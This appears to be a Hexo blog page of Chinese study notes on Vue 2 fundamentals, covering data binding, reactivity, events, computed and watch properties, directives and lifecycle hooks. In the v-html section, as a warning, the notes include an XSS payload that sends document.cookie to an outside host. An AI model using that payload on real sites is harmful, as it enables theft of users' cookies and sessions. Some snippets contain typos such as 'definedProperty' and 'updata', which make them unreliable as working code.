<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>vue2.0+3.0 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="vue特点:采用组件化(一个.vue文件)模式 提高代码复用率，让代码更好维护无需直接操作dom,提高开发效率虚拟dom(如果数据有变化，就会有帮助 将新的数据和旧的数据对比（diff算法），相同的会保留下来,新的数据再放上去)+Diff算法  尽量复用dom节点（原来有的，依然在用） 生产版，开发板版的区别：开发版(包含完整的警告和调试模式)生产版(删除了警告  项目写完了，要上线的时候 体积更">
<meta property="og:type" content="article">
<meta property="og:title" content="vue2.0+3.0">
<meta property="og:url" content="http://example.com/2022/03/25/vue2-0-3-0/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="vue特点:采用组件化(一个.vue文件)模式 提高代码复用率，让代码更好维护无需直接操作dom,提高开发效率虚拟dom(如果数据有变化，就会有帮助 将新的数据和旧的数据对比（diff算法），相同的会保留下来,新的数据再放上去)+Diff算法  尽量复用dom节点（原来有的，依然在用） 生产版，开发板版的区别：开发版(包含完整的警告和调试模式)生产版(删除了警告  项目写完了，要上线的时候 体积更">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-03-24T16:12:49.000Z">
<meta property="article:modified_time" content="2022-03-30T10:50:06.774Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-vue2-0-3-0" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/03/25/vue2-0-3-0/" class="article-date">
  <time class="dt-published" datetime="2022-03-24T16:12:49.000Z" itemprop="datePublished">2022-03-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      vue2.0+3.0
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="vue特点"><a href="#vue特点" class="headerlink" title="vue特点:"></a>vue特点:</h4><p>采用组件化(一个.vue文件)模式 提高代码复用率，让代码更好维护<br>无需直接操作dom,提高开发效率<br>虚拟dom(如果数据有变化，就会有帮助 将新的数据和旧的数据对比（diff算法），相同的会保留下来,新的数据再放上去)+Diff算法  尽量复用dom节点（原来有的，依然在用）</p>
<h4 id="生产版，开发板版的区别："><a href="#生产版，开发板版的区别：" class="headerlink" title="生产版，开发板版的区别："></a>生产版，开发板版的区别：</h4><p>开发版(包含完整的警告和调试模式)<br>生产版(删除了警告  项目写完了，要上线的时候 体积更小)</p>
<h4 id="安装DevTools："><a href="#安装DevTools：" class="headerlink" title="安装DevTools："></a>安装DevTools：</h4><p>生态系统 -&gt;工具 -&gt;DevTools-&gt;Chrome Extension<br>右上角黑的图标-&gt;管理扩展程序 -&gt;开发者模式打开-&gt;最小化浏览器<br>把安装包按住拖到底部的浏览器</p>
<h4 id="阻止vue在启动时出现生产提示："><a href="#阻止vue在启动时出现生产提示：" class="headerlink" title="阻止vue在启动时出现生产提示："></a>阻止vue在启动时出现生产提示：</h4><p>（未使用vue-cli之前）<br>Vue.config.productionTip&#x3D;false;</p>
<h4 id="出现favicon-ico：404错误："><a href="#出现favicon-ico：404错误：" class="headerlink" title="出现favicon.ico：404错误："></a>出现favicon.ico：404错误：</h4><p>（未使用vue-cli之前）<br>127.0.0.1代表本机<br>在vscode中点击 Open with live Server时 会在本机5500的端口上开了一台内置的小服务器，并且在整个工程(所有文件夹和文件)作为这台服务器的根资源去使用</p>
<p>把.icon的图标放在根路径下</p>
<h4 id="hello-world小案例"><a href="#hello-world小案例" class="headerlink" title="hello world小案例:"></a>hello world小案例:</h4><p>当data中的数据发生改变  整个模板会被重新解析<br>（未使用vue-cli之前）</p>
<div  id='root'
（（name））） <div 使用 （（）） 后可直接读取data里面的数据


<p>script&gt;</p>
<p>new Vue({ 创建vue实例<br>el:’#root’ 把工作成果放在id为root的盒子里面 值通常为css选择器字符串也可以写成<br>document.getElementById(“root”)<br>data:{ 数据供el所指定的容器使用 值暂时写成一个对象<br>name:’尚硅谷’<br>}</p>
<p>})</p>
<p>root容器里面依然复合html规范，只不过混入了一些特殊的vue语法<br>root容器里面的代码被称为Vue模板</p>
<p>先有容器，然后再有Vue实例 当Vue实例开始工作的时候 把整个容器拿过来  拿过来之后解析 看有没有特殊的语法(如:{  {}} 如果有就在data中查找，找到后就用对应的值把容器里面{  {…}}替换掉</p>
<p>容器与实例只能是1对1的关系</p>
  xxx要写js表达式，且xxx可以自动读取到data中所有的属性

<p>js表达式与js语句的区别:<br>js表达式：一个表达式会产生一个值，可以放在任意一个需要值的地方<br>如:a<br>a+b<br>demo(1)<br>x&#x3D;&#x3D;y?’a’:’b’</p>
<p>js代码(语句):<br>if（）{}<br>for(){}<br>&lt;&#x2F;script</p>
<h4 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法:"></a>模板语法:</h4><p>&lt;a v-bind:href&#x3D;’url’  前面有v-bind,后面的引号里面会当成js表达式执行<br>也可简写成 &lt;a :href&#x3D;’url’<br>还能够指定别的属性 &lt;a v-bind:href&#x3D;’url’ v-bind:x&#x3D;’hello’</p>
<p>…<br>data:{<br>url:’<a target="_blank" rel="noopener" href="http://www.atguigu.com&/#39;">www.atguigu.com&#39;</a><br>hello:’你好’<br>}</p>
<h4 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定:"></a>数据绑定:</h4><p>前面的v-bind是单向数据绑定 ：只能是data中的数据改变 去影响页面中的数据改变<br>，而如果页面中的数据改变，是不会影响到data中的数据改变</p>
<p>v-model为双向数据绑定 但不是所有元素都支持v-model,<br>v-model只能应用在表单类元素上(输入类元素)<br>&lt;input v-model:value&#x3D;’m’<br>因为v-model默认收集就是value值，所以可以简写成<br>&lt;input v-model&#x3D;’m’</p>
<h4 id="el与data的两种写法"><a href="#el与data的两种写法" class="headerlink" title="el与data的两种写法:"></a>el与data的两种写法:</h4><p>（未使用vue-cli之前）<br>el:<br>指定容器除了<br>const v&#x3D;new Vue({<br>el:’#root’<br>}</p>
<p>还可以 v.$mount(“#root”)</p>
<p>data:<br>data:{}可以是对象式</p>
<p>data：function(){ 也可以是函数式 并且必须返回一个对象<br>console.log(this) this为Vue实例对象 但如果是箭头函数形式就是全局window<br>return {<br>name:’尚硅谷’<br>}<br>}</p>
<p>一个重要原则:由Vue管理的函数(如 函数式的data)一定不要写成箭头函数，一旦写了,this就不是Vue实例了</p>
<h4 id="MVVM模型"><a href="#MVVM模型" class="headerlink" title="MVVM模型:"></a>MVVM模型:</h4><p>M (模型Model): 对应data中的数据<br>V (View)视图：模板<br>VM (视图模型 ViewModel):Vue实例对象</p>
 xxx 只要是Vue实例里面的属性都能看到  包括Vue原型链上的
<p>使用方式  直接  不需要加上 实例vm.</p>
<h4 id="底层原理-Object-defineProperty："><a href="#底层原理-Object-defineProperty：" class="headerlink" title="底层原理 Object.defineProperty："></a>底层原理 Object.defineProperty：</h4><p>给一个对象添加&#x2F;定义属性<br>数据劫持，数据代理，计算属性都由用到过:</p>
<p>参数1: 给谁添加<br>参数2:添加什么属性<br>参数3:配置项</p>
<p>let person&#x3D;{  这种方式 可删除，枚举，修改<br>name:’张三’<br>}<br>Object.defineProperty(person,’age’,{<br>value:18</p>
<p>})  这种方法定义的属性默认为不可枚举（不可遍历）<br>如果想让定义的属性可以枚举</p>
<p>Object.defineProperty(person,’age’,{<br>value:18<br>enumerable:true  (默认值为false,不可枚举)<br>})</p>
<p>writable:true(默认值为false，不可修改   即使做了修改操作，也不会报错，但不会影响原值)<br>configurable:true(默认值为false，不可删除   即使做了删除操作，也不会报错，但不会删除原值)</p>
<p>案例:<br> let number&#x3D;1;<br>var obj&#x3D;{age：number}<br>当number修改时  obj中age的值不会自动的修改<br>而是 还需手动执行  obj.age&#x3D;number;<br>太麻烦</p>
<p>有一种简单操作:<br>Object.definedProperty(obj,”age”,{<br>get:function(){<br>return number}<br>})</p>
<p>每次访问age属性，都会触发get函数（getter）的调用,且返回值就是age的值</p>
<p>当有人修改age属性值时,set函数（setter）会被调用，且返回值就是age的值（改变后的值）</p>
<p>Object.definedProperty(obj,”age”,{<br>set:function(value){<br>number&#x3D;value;<br>}<br>})</p>
<p>vscode应用商店里好用的提示插件：Vue3 Snippets</p>
<h4 id="数据代理"><a href="#数据代理" class="headerlink" title="数据代理:"></a>数据代理:</h4><p>什么是数据代理:<br>通过一个对象代理对另一个对象中属性的操作(读&#x2F;写)<br>obj2                       obj&#x3D;{x：1}</p>
<p>let obj&#x3D;{x:100}<br>let obj2&#x3D;{y:200}</p>
<p>Object.defineProperty(obj2,’x’,{<br>get(){<br>return obj.x;<br>},<br>set(value){<br>obj.x&#x3D;value;<br>}<br>})</p>
<p>Vue里的数据代理:<br>vm._data就是指 实例中的data 但内部做了数据劫持<br>vm._data&#x3D;&#x3D;&#x3D;data  :true(前提是这个data放在了全局)</p>
<p>关键的一步:把data中的数据放到vm身上一份（为了编码更方便 省略了 _data.name中的_data）</p>
<p>整个基本原理:<br>通过Object.defineProperty()把data中的所有属性添加到vm上<br>为每一个添加到vm身上的属性添加setter和getter<br>在setter和getter内部去操作（读&#x2F;写）data中对应的属性</p>
<h4 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理:"></a>事件处理:</h4><p>事件里面绑定的函数 （）可加可不加，但如果是插值语法必须加 如<p>{ {demo() }}&lt;&#x2F;p</p>
<p>点击时触发: &lt;button v-on:click&#x3D;”showInfo()” &lt;&#x2F;button<br>可简写成  &lt;button @click&#x3D;”showInfo”&gt;&lt;&#x2F;button</p>
<p>new Vue({<br>el:’#root’<br>document.getElementById(“root”)<br>data:{<br>name:’尚硅谷’<br>},<br>methods:{<br>showInfo(a){<br> 此处的this是vm（Vue实例对象） 这里的第一个参数（当没有传入参数的时候）是事件对象 可以获取a.target.innerText<br>}</p>
<p>如果想传入参数并且不会丢失event<br>&lt;button @click&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button  参数位置可以互换，不影响<br>}</p>
<h4 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符:"></a>事件修饰符:</h4><p>阻止事件默认行为:<br>methods:{<br>showInfo(event){<br>event.preventDefault();<br>}<br>或者<br>&lt;button @click.prevent&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button  (.prevent对点击事件click进行修饰)</p>
<p>阻止事件冒泡:<br>methods:{<br>showInfo(event){<br>event.stopPropagation();<br>}<br>或者<br>&lt;button @click.stop&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
<p>.once事件只触发一次<br>&lt;button @click.once&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
<p>.capture 事件的捕获模式 (事件开始从外往里面开始执行)<br>&lt;button @click.capture&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
<p>.self只有event.target是当前操作的元素对象时才触发事件（触发事件的前提条件是   事件对象为当前元素 包含不算）<br>&lt;button @click.self&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
<p>.passive（优先响应默认行为） 事件的默认行为会立即执行 无需等待事件回调函数执行完毕</p>
<div @scroll='demo'></div  滚动条 滚动时触发


<div @wheel='demo'></div   鼠标的滚轮 滚动时触发
当触发鼠标滚轮时 会执行对应函数  等函数中代码执行完后(这里如果出现一些很棒花时间的循环语句，会造成页面卡顿 ) 才会触发默认行为（滚动台向上/下移动一丢丢）

<div @wheel.passive='demo'></div  可以解决卡顿问题 （scroll事件本事就是先响应默认行为)

<p>v-model的三个修饰符:<br> .number: 让文本框中得到的结果为数字型，而不是默认的字符串<br>&lt; input type&#x3D;’number’ v-model.number&#x3D;’userInfo.age’ </p>
<p>.lazy:失去焦点时再收集<br>&lt; textarea v-model.lazy&#x3D;’userInfo.other’&gt;</p>
<p>.trim: 去掉首位空格</p>
<h4 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件:"></a>键盘事件:</h4><p>@keydowm :按下 没有抬起来<br>@keyup:按下 并且松手了</p>
<p>&lt;input @keyup.enter&#x3D;’’&gt;<br>松手后并且回车了才触发 这里的enter为按键别名</p>
<p>类似的按键别名还有:<br>delete:删除或退格<br>esc:退出<br>space:空格<br>tab:换行(特殊 必须配合keydown去使用 本身就可以移出焦点)<br>up:上<br>down:下<br>left：做<br>right:右</p>
<p>如果时多个单词组成的别名:<br>如CapsLock  需要用-分开<br>&lt;input @keyup.caps-lock&#x3D;’’&gt;</p>
<p>系统修饰键:(用法特殊)<br>ctrl alt shift meta<br>&lt;input @keyup.ctrl&#x3D;’’&gt;<br>按下修饰键的同时 再按下其他键 随后释放其他键 事件才被触发<br>需要  如同时按下ctrl +y  然后松开 才会触发 ctrl+i 也行 …<br>还可以 指定其他键<br>&lt;input @keyup.ctrl.y&#x3D;’’&gt; </p>
<h4 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性:"></a>计算属性:</h4><p>底层原理:接住了Object.definedProperty()里面的getter和setter<br>拿着已经写完的属性（data中的数据）去加工去计算，然后生成一个全新的属性</p>
<p>data里面放的是是属性<br>computed里面放的是计算属性（也在vm身上 和data中的数据一样可直接写在插值语法中）</p>
<p>当第一次读取计算属性的值时  会被缓存起来   后面再访问就会走缓存路线<br>对比之下 methods读取几次就会执行几次 没有任何缓存</p>
<p>data：{<br>firstName:’张’,<br>lastName:’三’<br>},<br>computed:{<br>当有人读取fullName时,get就会被调用,且get函数的返回值就是fullName的值<br>get什么时候被调用?(计算属性数据什么时候发生变化)1 初次读取时 2 所依赖的数据发生变化时<br>fullName:{<br>get（）{</p>
<p>return  this.firstName+’-‘+this.lastName<br>},<br>如果fullName可能会被改 如 vm.fullName&#x3D;1; 那么set函数必须写<br>set(value){<br>const arr&#x3D;value.split(“-“);<br>this.firstName&#x3D;arr[0];<br>this.lastName&#x3D;arr[1];<br>}<br>}</p>
<p>methods:{<br>fullName:function（）{<br>return  this.firstName+’-‘+this.lastName</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p></p


<p>计算属性简写形式（如果确定了只读 不改）</p>
<p>computed:{<br>fullName(){ 这个函数会直接当成get函数用<br>return  this.firstName+’-‘+this.lastName<br>},</p>
<h4 id="监视-侦听-属性"><a href="#监视-侦听-属性" class="headerlink" title="监视(侦听)属性:"></a>监视(侦听)属性:</h4><p>对比计算属性:<br>计算属性时不能开启异步任务来维护数据，而监视属性可以（不靠return 语句来返回数据）<br>computed能完成的功能，watch都能完成,watch能完成的功能，computed不一定能完成(如watch可以异步操作 ：setTimeout(function(){})，1000)</p>
<p>当watch,computed都能实现的时候，优先使用computed</p>
<p>对于计算属性里面的值也可以进行监测<br>监视属性必须存在才能监视（如果不存在，也不会报错）<br>data:{<br>isCold:true,<br>}<br>watch：{<br>isCold（认定为’isCold’）:{<br>immediate:true,初始化时让handle执行一次<br>handler(newValue,oldValue){当isCold属性发生改变时，会触发handler函数<br>}<br>}</p>
<p>监视的第二种写法<br>vm.$watch(‘isCold’,{</p>
<p>immediate:true,<br>handler(newValue,oldValue){<br>}</p>
<p>})<br>两个重要原则:<br>所有被vue管理的函数，最好写成普通函数，这样this的指向才是vm或者组件实例对象<br>所有不被vue管理的函数（定时器的回调函数，ajax的回调函数,promise的回调函数）,最好写成箭头函数，这样this的指向才是vm或者组件实例对象</p>
<h4 id="深度监视："><a href="#深度监视：" class="headerlink" title="深度监视："></a>深度监视：</h4><p>data:{<br>number:{ vue监视中 如果地址值没有变化，会默认number没有变化，所以不会触发对应的函数，vue 中的watch默认不会看地址值里面的内容<br>a:1,<br>b:2<br>}<br>}<br>watch:{<br>‘number.a’:{ 监视多级结构中 某个 属性的变化<br>handler（）{</p>
<p>}</p>
<p>watch:{<br>number:{<br>deep:true   开启了深度监视      监视多级结构中 所有 属性的变化<br>handler（）{</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p>简写形式（当配置项只有handler时才可以）<br>watch:{<br>number（newValue,oldValue）{ 这个函数相当于handler函数</p>
<p>}</p>
<p>或者<br>将<br>vm.$watch(‘isCold’,{</p>
<p>immediate:true,<br>handler(newValue,oldValue){<br>}</p>
<p>})<br>简写成<br>vm.$watch(‘isCold’,function(newValue,oldValue){</p>
<p>})</p>
<h4 id="绑定class样式"><a href="#绑定class样式" class="headerlink" title="绑定class样式:"></a>绑定class样式:</h4><div class='basic' :class='a' 动态样式绑定 适用于类名不确定

<p>data:{<br>a:’normal’<br>}</p>
<p>style<br>.normal{<br>…<br>}</p>
<p>或者 数组写法 &lt;div class&#x3D;’basic’ :class&#x3D;’arr’  适用于 个数不缺名 名字不确定</p>
<p>data:{<br>arr:[‘atguigu1’,’atguigu2’,’atguigu3’]<br>}</p>
<p>style<br>.atguigu1{}<br>.atguigu2{}</p>
<p>也可以</p>
<div class='basic' :class='[a,b,c]'
data:{
a:'atguigu1',
b:'atguigu2'
或者 对象写法 适用于个数确定 名字也确定
<div class='basic' :class='classObj'
data:{
classObj:{
atguigu1:false,
atguigu2:false
}
也可以
<div class='basic' :class='{atguigu1:false,atguigu2:false}'>


<h4 id="绑定style样式"><a href="#绑定style样式" class="headerlink" title="绑定style样式:"></a>绑定style样式:</h4><p style='{fontSize:fsize+"px"}'

<p>对象写法<br>data:{<br>fsize:40<br>} 通常改成</p>
<p style='styleObj'>

<p>data:{<br>styleObj:{<br>fontSize:’40px’<br>}<br>}<br>或者数组形式</p>
<p style='[styleObj,styleObj2]'

<p>data:{<br>styleObj:{<br>fontSize:’40px’<br>}，<br>styleObj2:{<br>backgroundColor:green;<br>}<br>}</p>
<h4 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染:"></a>条件渲染:</h4><p v-show='true'> 为true时显示 为false隐藏  （底层为 调整display的值  为false时 元素节点还在）
<p v-show='1==3'> 隐藏


<p v-if='false'> (为false时 元素节点都会消失) (底层：通过增加 删除节点)
<p v-else-if='false'> 
<p v-else> （v-else后面即使有条件也无效 不需要跟任何内容）

<p>如果有很高的切换频率，使用v-show<br>频率低的 有v-if<br>另外 v-if时有惰性的  如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染 相比之下 v-show 不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p>
<p>template只能和v-if连用 不能和v-show一起使用<br>&lt; template v-if&#x3D;’a&#x3D;&#x3D;&#x3D;1’&gt;<br>&lt; p&gt; 123&lt; &#x2F;p&gt;<br>&lt; &#x2F;template&gt;</p>
<h4 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染:"></a>列表渲染:</h4><ul
<li v-for='p in persons' :key='p.id'> {  {p. ...}}</li 
key的作用：让每一个li拥有了一个唯一的标识（前面只有加了: 后面才会被当成表达式处理）
或者
<li v-for='（p,index） in persons' :key='index'>  (把 in 换成 of也行)

<p>data:{<br>persons:[{},{},{}]<br>}</p>
<p>或者 也可以遍历对象</p>
<li v-for='（p,k） in car' :key='k'>  (这里p 指 属性值  k表示属性名) (把 in 换成 of也行)

<p>data:{<br>car：{<br>name：1，<br>price:2,<br>color:3<br>}<br>}</p>
<p>v-for也可以遍历字符串</p>
<p>也可以遍历次数<br>如  v-for&#x3D;’(a,b) of 5’<br>a 为 1 2 3 4 5<br>b 为 0 1 2 3 4</p>
<h4 id="key的作用与原理"><a href="#key的作用与原理" class="headerlink" title="key的作用与原理:"></a>key的作用与原理:</h4><p>把初始数据生成虚拟dom（真实dom身上没有key,但虚拟dom身上一定会有key）(此时页面啥也没有，只是内存中出现了虚拟节点)<br>然后将虚拟dom转换为真实dom<br>用户开始输入内容，数据开始更新，出现了新的数据<br>根据新的数据，生成 新的虚拟dom</p>
<p>然后进行虚拟dom对比算法（称为diff算法,将新的与旧的虚拟dom对比，此时依赖的就是key）（举例 ： ，&lt;li key&#x3D;’0’ 老王 20  &lt;input type&#x3D;’text’&lt;&#x2F;li’如果对比之后  如果节点中key值一样，就会拿来对比  先对比文本节点 然后对比标签节点， 如果标签名一样，标签结构一样，所有属性都一样不会去考虑文本节点一不一样，最终对比结果就是一样的  可如果文本节点不同，就会把新的虚拟dom转化为真实dom,但input元素这部分和旧的是一样的，用的是旧的虚拟dom生成的真实dom） </p>
<p>使用index作为key不是一定会有问题，如果对数据进行了破坏顺序的操作（如数组中往前面加元素，会造成破坏，而往后面添加则不会，因为此时的key为数组的索引值）</p>
<p>如果不写key,遍历时的索引值会默认最为key值</p>
<p>key值最好用唯一标识(id,身份证号)</p>
<h4 id="更新时的一个问题-监视数据的一个原理"><a href="#更新时的一个问题-监视数据的一个原理" class="headerlink" title="更新时的一个问题(监视数据的一个原理):"></a>更新时的一个问题(监视数据的一个原理):</h4><p>对象中后追加的属性，Vue默认不做响应式处理<br>如这种情况的改变vue监测不到:<br>data:{<br>persons:[{},{},{}],<br>},<br>methods:{<br>updataMei(){<br>this.person[0]&#x3D;{…}  不奏效 (如果只是数组中某一个元素 的某一个属性做赋值是没问题的  如this.person[0].name&#x3D;123 是可以的)<br>但这样写可以  this.person.splice(0,1,{…})<br>}</p>
<p>}<br>如果显示结果为undefined,那么页面不会报错，但也不会有显示</p>
<p>数组更新监测:<br>Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。这些被包裹过的方法包括：</p>
<p>push()<br>pop()<br>shift()<br>unshift()<br>splice()<br>sort()<br>reverse()</p>
<p>如果是对象更新:<br>data:{<br>student:{name:’atguigu’},<br>},<br>methods:{<br>addSex(){<br>this.student.sex&#x3D;’男’； 不奏效<br>需要这样写   Vue.set(vm._data.student,…)<br>可以简写成   Vue.set(this.student,’sex’,’男’)<br>也可以  this.$set(….)  （这是对于对象）</p>
<p>用这种方式对于数组 （hobby:[‘你’,’猜’]）:<br> Vue.set(this.hobby,0,’我’) 0 表示元素的索引<br>}</p>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器:"></a>过滤器:</h4><p>对数据进行加工<br>并没有改变原本的数据，而是产生了新的数据<br>对v-model不适用<br>使用过滤器的场景: {  {xxx|过滤器名}}或者 v-bind:属性&#x3D;”xxx|过滤器名”</p>
<p>{  {time |timeFormatter}} 首先读取 time然后把这个当作参数传给 timeFormatter，调完这个函数后 拿到这个返回值 然后用这个返回值将原来整个替换掉</p>
<p>如果{  {time |timeFormatter（’a’）}} 有括号，并且里面有参数，将作为函数中的第二个参数传入，第一个还是time</p>
<p>filters:{ 与methods并列<br>timeFormatter（）{</p>
<p>}</p>
<p>也可以多个过滤器的串联:<br>{  {time |timeFormatter|mySlice}} 这里time不会直接传给mySlice,而是只能传给timeFormatter,timeFormatter执行完成之后的返回结果将作为mySlice的传入实参</p>
<p>filters:{<br>timeFormatter（）{<br>return …<br>},<br>mySlice(){<br>return …<br>}</p>
<p>上面是局部过滤器</p>
<p>下面是全局过滤器:<br>Vue.filter(‘mySlice’,function（）{<br>return …</p>
<p>})</p>
<h4 id="v-text-v-html指令"><a href="#v-text-v-html指令" class="headerlink" title="v-text,v-html指令:"></a>v-text,v-html指令:</h4><p>&lt; div v-text&#x3D;’’&gt;:</p>
<p>渲染文本内容， 会将所有的字符串当成正常的文本去解析，即使里面有标签也不会当成标签去解析</p>
<p>&lt; div v-html&#x3D;’str’&gt;:<br>与上面一样，但可以识别html的结构<br>v-html可以出现的危险的行为:</p>
<p>data:{<br>str:’&lt;a href&#x3D;javaScript:location.href&#x3D;”<a target="_blank" rel="noopener" href="http://www.baidu.com/?&quot;+document.cookie&#39;&gt;">http://www.baidu.com?&quot;+document.cookie&#39;&gt;</a>…</a><br>此时点击该标签 跳转时 会将当前网站上的所有cookie(如果用户没有勾选 …only)传给 指定的百度这个网站<br>一定要在可信的内容上使用v-html<br>永远不要用在在用户提交的内容上</p>
<h4 id="v-cloak指令-没有值"><a href="#v-cloak指令-没有值" class="headerlink" title="v-cloak指令(没有值):"></a>v-cloak指令(没有值):</h4><p>本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性<br>使用css配合v-cloak可以解决网速慢时页面展示出未经解析的模板的问题<br>&lt; h2 v-cloak&gt;…&lt;&#x2F; h2&gt;</p>
<p>&lt; style&gt;<br>[v-cloak]:{<br>display:none;<br>}</p>
<h4 id="v-once指令"><a href="#v-once指令" class="headerlink" title="v-once指令:"></a>v-once指令:</h4><p>v-once所在节点在初次动态渲染后，就视为静态内容了<br>以后数据的改变不会引起v-once所在结构的更新<br>&lt; h2 v-once&gt;{  {n}}&lt; &#x2F;h2&gt;<br>data:{<br>n:1<br>}</p>
<h4 id="v-pre指令"><a href="#v-pre指令" class="headerlink" title="v-pre指令:"></a>v-pre指令:</h4><p>跳过所在节点的编译过程<br>使用场景:<br>没有使用插值语法的节点<br>没有使用指令语法</p>
<h4 id="自定义指令-函数式"><a href="#自定义指令-函数式" class="headerlink" title="自定义指令:函数式:"></a>自定义指令:函数式:</h4><p>如:定义一个v-big指令，将绑定的值放大10倍<br>&lt; h2&gt;放大10倍后n的值是：&lt; span v-big&#x3D;’n’&gt;&lt; &#x2F;span&gt;  &lt; &#x2F;h2&gt;<br>data:{<br>n：10</p>
<p>directives:{与methods同级<br>big(element,binding){element这里指&lt; span&gt;&lt; &#x2F;span&gt;  而binding是一个对象 其中一个是value属性 值为n<br>element.innerText&#x3D;binding.value*10; (这里函数里面不需要加return)</p>
<p>}</p>
<p>big函数何时会被调用:<br>指令与元素成功绑定时(一上来)(仅仅是内存中绑定了关系，此时页面中并没有出现该元素)<br>指令所在模板被重新解析时(data中有数据发生改变时)</p>
<h4 id="自定义指令：对象式"><a href="#自定义指令：对象式" class="headerlink" title="自定义指令：对象式"></a>自定义指令：对象式</h4><p>所有 指令  函数里面的this都是window</p>
<p>举例：自定义v-fbind指令 让input框自动获取焦点<br>&lt; span v-fbind：value&#x3D;’n’&gt;&lt; &#x2F;span&gt; </p>
<p>directives:{ 下面三个可以被称为钩子函数<br>fbind:{<br>bind(element,binding){<br>element.innerText&#x3D;binding.value<br>}， 指令与元素成功绑定时调用<br>inserted(element,binding){<br>element.focus();<br>}， 指令所在元素被插入页面时调用<br>updata(element,binding){<br>element.innerText&#x3D;binding.value}  指令所在模板被重新解析时调用<br>}</p>
<p>}</p>
<p>细节点:命名的问题<br>如 &lt; span v-bigNumber：value&#x3D;’n’&gt;&lt; &#x2F;span&gt; </p>
<p>directives:{ 下面三个可以被称为钩子函数<br>bigNumber:… 无效</p>
<p>可以这样但不推荐  bignumber:… </p>
<p>如 &lt; span v-big-number：value&#x3D;’n’&gt;&lt; &#x2F;span&gt;<br>directives:{<br>‘big-number’:…</p>
<p>上面时局部的指令</p>
<p>下面时全局的指令: 对象式<br>Vue.directive(‘fbind’,{</p>
<p>bind(element,binding){<br>element.innerText&#x3D;binding.value<br>}<br>inserted(element,binding){<br>element.focus();<br>}<br>updata(element,binding){<br>element.innerText&#x3D;binding.value}<br>}</p>
<p>或者 函数式<br>Vue.directive(‘bind’,function(){…})</p>
<p>总结:指令定义式不加v-,但使用时要加v-</p>
<h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期:"></a>生命周期:</h4><p>&lt; div id&#x3D;’root’&gt;1处&lt; &#x2F;div&gt;</p>
<p>el:’#root’<br>template:’&lt; div&gt;…. </div>‘  这里只能有一个根节点(这里写和在1处写是一样的效果)</p>
<p>生命周期函数中的this指向vm或组件实例对象</p>
<p>挂载流程 4个:</p>
<p>beforeCreate(){} 无法通过vm访问到data中的数据,data中的方法</p>
<p>created(){} 可以通过vm访问到data中的数据,data中的方法</p>
<p>beforeMount(){} 页面呈现的是未经Vue编译的dom结构，所有对dom的操作都不奏效</p>
<p>mounted(){} 页面呈现 的是经过Vue编译后的dom，对dom的操作均有效<br>与methods同级  Vue完成模板的解析并把真实dom元素放入页面后调用</p>
<p>常用于 发送ajax请求,开启定时器，绑定自定义事件等，</p>
<p>更新流程:<br>beforeUpdate(){}  此时 ，数据是新的,但页面是旧的，即页面还没有和数据保持同步 (之前是指  创建数据检测 数据代理之前)</p>
<p>updated(){}  数据是新的，页面也是新的，即页面和数据保持了同步</p>
<p>销毁流程:<br>销毁后，vm的工作成果还在，只是不会再接管页面了，无法有任何对页面的操作</p>
<p>会解绑全部指令和(自定义的)事件监听器</p>
<p>可以在方法里面 写 this.$destroy()</p>
